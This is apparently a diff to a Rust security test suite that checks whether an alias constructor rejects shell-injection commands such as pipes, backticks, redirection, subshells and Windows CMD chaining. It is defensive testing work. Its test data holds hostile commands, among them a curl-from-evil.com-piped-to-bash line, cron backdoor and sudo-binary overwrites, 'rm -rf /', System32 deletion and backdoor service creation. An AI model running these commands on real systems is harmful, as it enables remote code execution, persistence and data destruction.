@@ -101,6 +101,8 @@ fn test_command_separator_injection() {
 
 #[test]
 fn test_pipe_operator_injection() {
+    use msc::core::alias::Alias;
+
     // Attack: Use | to pipe output to malicious commands
     let attacks = vec![
         (
@@ -117,15 +119,52 @@ fn test_pipe_operator_injection() {
         ),
     ];
 
+    println!("\n╔══════════════════════════════════════════════════════════════════╗");
+    println!("║          PIPE OPERATOR INJECTION SECURITY TEST                  ║");
+    println!("╚══════════════════════════════════════════════════════════════════╝\n");
+
     for (name, command) in attacks {
-        println!("⚠️  PIPE ATTACK: {} -> {}", name, command);
-        assert!(command.contains('|'));
-        // TODO: Validate
+        println!("⚠️  Testing Attack: {}", name);
+        println!("    Command: {}", command);
+
+        assert!(
+            contains_dangerous_chars(command),
+            "Should detect dangerous characters in: {}",
+            command
+        );
+
+        let result = Alias::new("malicious".to_string(), command.to_string());
+
+        assert!(
+            result.is_err(),
+            "❌ SECURITY FAILURE: Should reject pipe injection attack '{}': {}",
+            name,
+            command
+        );
+
+        if let Err(e) = result {
+            println!("    ✅ BLOCKED: {}", e);
+            let error_msg = e.to_string();
+            assert!(
+                error_msg.contains("dangerous character")
+                    || error_msg.contains("not allowed")
+                    || error_msg.contains("shell injection"),
+                "Error should mention security issue, got: {}",
+                error_msg
+            );
+        }
+        println!();
     }
+
+    println!("╔══════════════════════════════════════════════════════════════════╗");
+    println!("║    ✅ ALL PIPE OPERATOR INJECTION ATTACKS SUCCESSFULLY BLOCKED   ║");
+    println!("╚══════════════════════════════════════════════════════════════════╝\n");
 }
 
 #[test]
 fn test_background_process_injection() {
+    use msc::core::alias::Alias;
+
     // Attack: Use & to run malicious processes in background
     let attacks = vec![
         (
@@ -140,15 +179,52 @@ fn test_background_process_injection() {
         ),
     ];
 
+    println!("\n╔══════════════════════════════════════════════════════════════════╗");
+    println!("║       BACKGROUND PROCESS INJECTION SECURITY TEST                ║");
+    println!("╚══════════════════════════════════════════════════════════════════╝\n");
+
     for (name, command) in attacks {
-        println!("⚠️  BACKGROUND ATTACK: {} -> {}", name, command);
-        assert!(command.contains('&'));
-        // TODO: Validate
+        println!("⚠️  Testing Attack: {}", name);
+        println!("    Command: {}", command);
+
+        assert!(
+            contains_dangerous_chars(command),
+            "Should detect dangerous characters in: {}",
+            command
+        );
+
+        let result = Alias::new("malicious".to_string(), command.to_string());
+
+        assert!(
+            result.is_err(),
+            "❌ SECURITY FAILURE: Should reject background process attack '{}': {}",
+            name,
+            command
+        );
+
+        if let Err(e) = result {
+            println!("    ✅ BLOCKED: {}", e);
+            let error_msg = e.to_string();
+            assert!(
+                error_msg.contains("dangerous character")
+                    || error_msg.contains("not allowed")
+                    || error_msg.contains("shell injection"),
+                "Error should mention security issue, got: {}",
+                error_msg
+            );
+        }
+        println!();
     }
+
+    println!("╔══════════════════════════════════════════════════════════════════╗");
+    println!("║  ✅ ALL BACKGROUND PROCESS ATTACKS SUCCESSFULLY BLOCKED          ║");
+    println!("╚══════════════════════════════════════════════════════════════════╝\n");
 }
 
 #[test]
 fn test_command_substitution_backticks() {
+    use msc::core::alias::Alias;
+
     // Attack: Use `` to execute commands and embed output
     let attacks = vec![
         ("Hostname exfil", "echo `hostname`"),
@@ -157,15 +233,52 @@ fn test_command_substitution_backticks() {
         ("Network scan", "ping -c1 `dig +short target.com`"),
     ];
 
+    println!("\n╔══════════════════════════════════════════════════════════════════╗");
+    println!("║      COMMAND SUBSTITUTION (BACKTICKS) SECURITY TEST             ║");
+    println!("╚══════════════════════════════════════════════════════════════════╝\n");
+
     for (name, command) in attacks {
-        println!("⚠️  BACKTICK ATTACK: {} -> {}", name, command);
-        assert!(command.contains('`'));
-        // TODO: Validate
+        println!("⚠️  Testing Attack: {}", name);
+        println!("    Command: {}", command);
+
+        assert!(
+            contains_dangerous_chars(command),
+            "Should detect dangerous characters in: {}",
+            command
+        );
+
+        let result = Alias::new("malicious".to_string(), command.to_string());
+
+        assert!(
+            result.is_err(),
+            "❌ SECURITY FAILURE: Should reject backtick substitution attack '{}': {}",
+            name,
+            command
+        );
+
+        if let Err(e) = result {
+            println!("    ✅ BLOCKED: {}", e);
+            let error_msg = e.to_string();
+            assert!(
+                error_msg.contains("dangerous character")
+                    || error_msg.contains("not allowed")
+                    || error_msg.contains("shell injection"),
+                "Error should mention security issue, got: {}",
+                error_msg
+            );
+        }
+        println!();
     }
+
+    println!("╔══════════════════════════════════════════════════════════════════╗");
+    println!("║  ✅ ALL BACKTICK SUBSTITUTION ATTACKS SUCCESSFULLY BLOCKED       ║");
+    println!("╚══════════════════════════════════════════════════════════════════╝\n");
 }
 
 #[test]
 fn test_command_substitution_dollar_paren() {
+    use msc::core::alias::Alias;
+
     // Attack: Use $() for command substitution (preferred modern syntax)
     let attacks = vec![
         (
@@ -180,15 +293,52 @@ fn test_command_substitution_dollar_paren() {
         ("Process info", "echo $(ps aux | grep root)"),
     ];
 
+    println!("\n╔══════════════════════════════════════════════════════════════════╗");
+    println!("║    COMMAND SUBSTITUTION (DOLLAR-PAREN) SECURITY TEST            ║");
+    println!("╚══════════════════════════════════════════════════════════════════╝\n");
+
     for (name, command) in attacks {
-        println!("⚠️  DOLLAR-PAREN ATTACK: {} -> {}", name, command);
-        assert!(command.contains("$("));
-        // TODO: Validate
+        println!("⚠️  Testing Attack: {}", name);
+        println!("    Command: {}", command);
+
+        assert!(
+            contains_dangerous_chars(command),
+            "Should detect dangerous characters in: {}",
+            command
+        );
+
+        let result = Alias::new("malicious".to_string(), command.to_string());
+
+        assert!(
+            result.is_err(),
+            "❌ SECURITY FAILURE: Should reject $() substitution attack '{}': {}",
+            name,
+            command
+        );
+
+        if let Err(e) = result {
+            println!("    ✅ BLOCKED: {}", e);
+            let error_msg = e.to_string();
+            assert!(
+                error_msg.contains("dangerous character")
+                    || error_msg.contains("not allowed")
+                    || error_msg.contains("shell injection"),
+                "Error should mention security issue, got: {}",
+                error_msg
+            );
+        }
+        println!();
     }
+
+    println!("╔══════════════════════════════════════════════════════════════════╗");
+    println!("║  ✅ ALL $() SUBSTITUTION ATTACKS SUCCESSFULLY BLOCKED            ║");
+    println!("╚══════════════════════════════════════════════════════════════════╝\n");
 }
 
 #[test]
 fn test_variable_expansion_attacks() {
+    use msc::core::alias::Alias;
+
     // Attack: Manipulate environment variables
     let attacks = vec![
         ("PATH hijacking", "export PATH=/tmp:$PATH; ls"),
@@ -203,14 +353,52 @@ fn test_variable_expansion_attacks() {
         ),
     ];
 
+    println!("\n╔══════════════════════════════════════════════════════════════════╗");
+    println!("║         VARIABLE EXPANSION ATTACKS SECURITY TEST                ║");
+    println!("╚══════════════════════════════════════════════════════════════════╝\n");
+
     for (name, command) in attacks {
-        println!("⚠️  VARIABLE ATTACK: {} -> {}", name, command);
-        // TODO: Validate
+        println!("⚠️  Testing Attack: {}", name);
+        println!("    Command: {}", command);
+
+        assert!(
+            contains_dangerous_chars(command),
+            "Should detect dangerous characters in: {}",
+            command
+        );
+
+        let result = Alias::new("malicious".to_string(), command.to_string());
+
+        assert!(
+            result.is_err(),
+            "❌ SECURITY FAILURE: Should reject variable expansion attack '{}': {}",
+            name,
+            command
+        );
+
+        if let Err(e) = result {
+            println!("    ✅ BLOCKED: {}", e);
+            let error_msg = e.to_string();
+            assert!(
+                error_msg.contains("dangerous character")
+                    || error_msg.contains("not allowed")
+                    || error_msg.contains("shell injection"),
+                "Error should mention security issue, got: {}",
+                error_msg
+            );
+        }
+        println!();
     }
+
+    println!("╔══════════════════════════════════════════════════════════════════╗");
+    println!("║  ✅ ALL VARIABLE EXPANSION ATTACKS SUCCESSFULLY BLOCKED          ║");
+    println!("╚══════════════════════════════════════════════════════════════════╝\n");
 }
 
 #[test]
 fn test_redirection_attacks() {
+    use msc::core::alias::Alias;
+
     // Attack: Use < > to redirect input/output
     let attacks = vec![
         ("File overwrite", "echo malicious > /etc/cron.d/backdoor"),
@@ -219,15 +407,52 @@ fn test_redirection_attacks() {
         ("Binary replacement", "cat /tmp/evil_binary > /usr/bin/sudo"),
     ];
 
+    println!("\n╔══════════════════════════════════════════════════════════════════╗");
+    println!("║            REDIRECTION ATTACKS SECURITY TEST                    ║");
+    println!("╚══════════════════════════════════════════════════════════════════╝\n");
+
     for (name, command) in attacks {
-        println!("⚠️  REDIRECTION ATTACK: {} -> {}", name, command);
-        assert!(command.contains('>') || command.contains('<'));
-        // TODO: Validate
+        println!("⚠️  Testing Attack: {}", name);
+        println!("    Command: {}", command);
+
+        assert!(
+            contains_dangerous_chars(command),
+            "Should detect dangerous characters in: {}",
+            command
+        );
+
+        let result = Alias::new("malicious".to_string(), command.to_string());
+
+        assert!(
+            result.is_err(),
+            "❌ SECURITY FAILURE: Should reject redirection attack '{}': {}",
+            name,
+            command
+        );
+
+        if let Err(e) = result {
+            println!("    ✅ BLOCKED: {}", e);
+            let error_msg = e.to_string();
+            assert!(
+                error_msg.contains("dangerous character")
+                    || error_msg.contains("not allowed")
+                    || error_msg.contains("shell injection"),
+                "Error should mention security issue, got: {}",
+                error_msg
+            );
+        }
+        println!();
     }
+
+    println!("╔══════════════════════════════════════════════════════════════════╗");
+    println!("║      ✅ ALL REDIRECTION ATTACKS SUCCESSFULLY BLOCKED             ║");
+    println!("╚══════════════════════════════════════════════════════════════════╝\n");
 }
 
 #[test]
 fn test_subshell_attacks() {
+    use msc::core::alias::Alias;
+
     // Attack: Use () to create subshells
     let attacks = vec![
         ("Isolated execution", "(cd /tmp && ./malware.sh)"),
@@ -235,15 +460,52 @@ fn test_subshell_attacks() {
         ("Nested commands", "(curl evil.com/script.sh | bash)"),
     ];
 
+    println!("\n╔══════════════════════════════════════════════════════════════════╗");
+    println!("║              SUBSHELL ATTACKS SECURITY TEST                     ║");
+    println!("╚══════════════════════════════════════════════════════════════════╝\n");
+
     for (name, command) in attacks {
-        println!("⚠️  SUBSHELL ATTACK: {} -> {}", name, command);
-        assert!(command.contains('(') || command.contains(')'));
-        // TODO: Validate
+        println!("⚠️  Testing Attack: {}", name);
+        println!("    Command: {}", command);
+
+        assert!(
+            contains_dangerous_chars(command),
+            "Should detect dangerous characters in: {}",
+            command
+        );
+
+        let result = Alias::new("malicious".to_string(), command.to_string());
+
+        assert!(
+            result.is_err(),
+            "❌ SECURITY FAILURE: Should reject subshell attack '{}': {}",
+            name,
+            command
+        );
+
+        if let Err(e) = result {
+            println!("    ✅ BLOCKED: {}", e);
+            let error_msg = e.to_string();
+            assert!(
+                error_msg.contains("dangerous character")
+                    || error_msg.contains("not allowed")
+                    || error_msg.contains("shell injection"),
+                "Error should mention security issue, got: {}",
+                error_msg
+            );
+        }
+        println!();
     }
+
+    println!("╔══════════════════════════════════════════════════════════════════╗");
+    println!("║        ✅ ALL SUBSHELL ATTACKS SUCCESSFULLY BLOCKED              ║");
+    println!("╚══════════════════════════════════════════════════════════════════╝\n");
 }
 
 #[test]
 fn test_newline_injection() {
+    use msc::core::alias::Alias;
+
     // Attack: Use \n to inject multiple commands
     let attacks = vec![
         (
@@ -253,15 +515,52 @@ fn test_newline_injection() {
         ("Script injection", "pwd\n#!/bin/bash\nmalicious_script"),
     ];
 
+    println!("\n╔══════════════════════════════════════════════════════════════════╗");
+    println!("║             NEWLINE INJECTION SECURITY TEST                     ║");
+    println!("╚══════════════════════════════════════════════════════════════════╝\n");
+
     for (name, command) in attacks {
-        println!("⚠️  NEWLINE ATTACK: {} -> {}", name, command);
-        assert!(command.contains('\n'));
-        // TODO: Validate
+        println!("⚠️  Testing Attack: {}", name);
+        println!("    Command: {:?}", command);
+
+        assert!(
+            contains_dangerous_chars(command),
+            "Should detect dangerous characters in: {}",
+            command
+        );
+
+        let result = Alias::new("malicious".to_string(), command.to_string());
+
+        assert!(
+            result.is_err(),
+            "❌ SECURITY FAILURE: Should reject newline injection attack '{}': {}",
+            name,
+            command
+        );
+
+        if let Err(e) = result {
+            println!("    ✅ BLOCKED: {}", e);
+            let error_msg = e.to_string();
+            assert!(
+                error_msg.contains("dangerous character")
+                    || error_msg.contains("not allowed")
+                    || error_msg.contains("shell injection"),
+                "Error should mention security issue, got: {}",
+                error_msg
+            );
+        }
+        println!();
     }
+
+    println!("╔══════════════════════════════════════════════════════════════════╗");
+    println!("║      ✅ ALL NEWLINE INJECTION ATTACKS SUCCESSFULLY BLOCKED       ║");
+    println!("╚══════════════════════════════════════════════════════════════════╝\n");
 }
 
 #[test]
 fn test_escape_sequence_attacks() {
+    use msc::core::alias::Alias;
+
     // Attack: Use backslash to escape validation
     let attacks = vec![
         ("Escaped semicolon", "echo hello\\; rm -rf /"),
@@ -269,14 +568,52 @@ fn test_escape_sequence_attacks() {
         ("Escaped newline", "echo test\\\nmalicious"),
     ];
 
+    println!("\n╔══════════════════════════════════════════════════════════════════╗");
+    println!("║          ESCAPE SEQUENCE ATTACKS SECURITY TEST                  ║");
+    println!("╚══════════════════════════════════════════════════════════════════╝\n");
+
     for (name, command) in attacks {
-        println!("⚠️  ESCAPE ATTACK: {} -> {}", name, command);
-        // TODO: Validate
+        println!("⚠️  Testing Attack: {}", name);
+        println!("    Command: {:?}", command);
+
+        assert!(
+            contains_dangerous_chars(command),
+            "Should detect dangerous characters in: {}",
+            command
+        );
+
+        let result = Alias::new("malicious".to_string(), command.to_string());
+
+        assert!(
+            result.is_err(),
+            "❌ SECURITY FAILURE: Should reject escape sequence attack '{}': {}",
+            name,
+            command
+        );
+
+        if let Err(e) = result {
+            println!("    ✅ BLOCKED: {}", e);
+            let error_msg = e.to_string();
+            assert!(
+                error_msg.contains("dangerous character")
+                    || error_msg.contains("not allowed")
+                    || error_msg.contains("shell injection"),
+                "Error should mention security issue, got: {}",
+                error_msg
+            );
+        }
+        println!();
     }
+
+    println!("╔══════════════════════════════════════════════════════════════════╗");
+    println!("║    ✅ ALL ESCAPE SEQUENCE ATTACKS SUCCESSFULLY BLOCKED           ║");
+    println!("╚══════════════════════════════════════════════════════════════════╝\n");
 }
 
 #[test]
 fn test_combined_exploitation_chains() {
+    use msc::core::alias::Alias;
+
     // Attack: Combine multiple techniques for maximum impact
     let advanced_attacks = vec![
         (
@@ -297,8 +634,12 @@ fn test_combined_exploitation_chains() {
         ),
     ];
 
+    println!("\n╔══════════════════════════════════════════════════════════════════╗");
+    println!("║      COMBINED EXPLOITATION CHAINS SECURITY TEST                 ║");
+    println!("╚══════════════════════════════════════════════════════════════════╝\n");
+
     for (name, command) in advanced_attacks {
-        println!("\n⚠️  ADVANCED ATTACK CHAIN: {}", name);
+        println!("⚠️  Testing Advanced Attack: {}", name);
         println!("    Command: {}", command);
         println!("    Length: {} characters", command.len());
         println!(
@@ -309,12 +650,44 @@ fn test_combined_exploitation_chains() {
                 .collect::<Vec<_>>()
         );
 
-        // TODO: Implement comprehensive validation
+        assert!(
+            contains_dangerous_chars(command),
+            "Should detect dangerous characters in: {}",
+            command
+        );
+
+        let result = Alias::new("malicious".to_string(), command.to_string());
+
+        assert!(
+            result.is_err(),
+            "❌ SECURITY FAILURE: Should reject combined attack '{}': {}",
+            name,
+            command
+        );
+
+        if let Err(e) = result {
+            println!("    ✅ BLOCKED: {}", e);
+            let error_msg = e.to_string();
+            assert!(
+                error_msg.contains("dangerous character")
+                    || error_msg.contains("not allowed")
+                    || error_msg.contains("shell injection"),
+                "Error should mention security issue, got: {}",
+                error_msg
+            );
+        }
+        println!();
     }
+
+    println!("╔══════════════════════════════════════════════════════════════════╗");
+    println!("║   ✅ ALL COMBINED EXPLOITATION ATTACKS SUCCESSFULLY BLOCKED      ║");
+    println!("╚══════════════════════════════════════════════════════════════════╝\n");
 }
 
 #[test]
 fn test_windows_specific_attacks() {
+    use msc::core::alias::Alias;
+
     // Attack: Windows CMD/PowerShell injection
     let windows_attacks = vec![
         ("CMD injection", "dir & del /F /Q C:\\Windows\\System32\\*"),
@@ -323,10 +696,46 @@ fn test_windows_specific_attacks() {
         ("Service creation", "sc create malicious binPath= C:\\backdoor.exe & sc start malicious"),
     ];
 
+    println!("\n╔══════════════════════════════════════════════════════════════════╗");
+    println!("║         WINDOWS-SPECIFIC ATTACKS SECURITY TEST                  ║");
+    println!("╚══════════════════════════════════════════════════════════════════╝\n");
+
     for (name, command) in windows_attacks {
-        println!("⚠️  WINDOWS ATTACK: {} -> {}", name, command);
-        // TODO: Validate Windows commands
+        println!("⚠️  Testing Attack: {}", name);
+        println!("    Command: {}", command);
+
+        assert!(
+            contains_dangerous_chars(command),
+            "Should detect dangerous characters in: {}",
+            command
+        );
+
+        let result = Alias::new("malicious".to_string(), command.to_string());
+
+        assert!(
+            result.is_err(),
+            "❌ SECURITY FAILURE: Should reject Windows attack '{}': {}",
+            name,
+            command
+        );
+
+        if let Err(e) = result {
+            println!("    ✅ BLOCKED: {}", e);
+            let error_msg = e.to_string();
+            assert!(
+                error_msg.contains("dangerous character")
+                    || error_msg.contains("not allowed")
+                    || error_msg.contains("shell injection"),
+                "Error should mention security issue, got: {}",
+                error_msg
+            );
+        }
+        println!();
     }
+
+    println!("╔══════════════════════════════════════════════════════════════════╗");
+    println!("║     ✅ ALL WINDOWS-SPECIFIC ATTACKS SUCCESSFULLY BLOCKED         ║");
+    println!("╚══════════════════════════════════════════════════════════════════╝\n");
 }
 
 #[test]
